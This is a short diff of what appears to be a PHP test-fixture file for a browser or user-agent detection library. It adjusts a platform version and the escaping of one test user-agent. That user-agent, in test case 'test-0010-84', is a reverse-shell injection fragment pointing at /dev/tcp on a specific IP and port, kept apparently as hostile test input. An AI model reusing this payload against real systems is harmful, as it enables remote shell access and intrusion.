@@ -1115,7 +1115,7 @@ return [
             'Browser_Modus'           => 'unknown',
             'Browser_Version'         => '49.0',
             'Platform_Name'           => 'Android',
-            'Platform_Version'        => '4.4',
+            'Platform_Version'        => '4.4.2',
             'Platform_Bits'           => 32,
             'Platform_Maker'          => 'Google Inc',
             'Device_Name'             => 'unknown',
@@ -2018,7 +2018,7 @@ return [
         ],
     ],
     'test-0010-84' => [
-        'ua'         => '<> /dev/tcp/95.143.194.102/81 >&0 2>&0\'',
+        'ua'         => '<> /dev/tcp/95.143.194.102/81 >&0 2>&0\\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
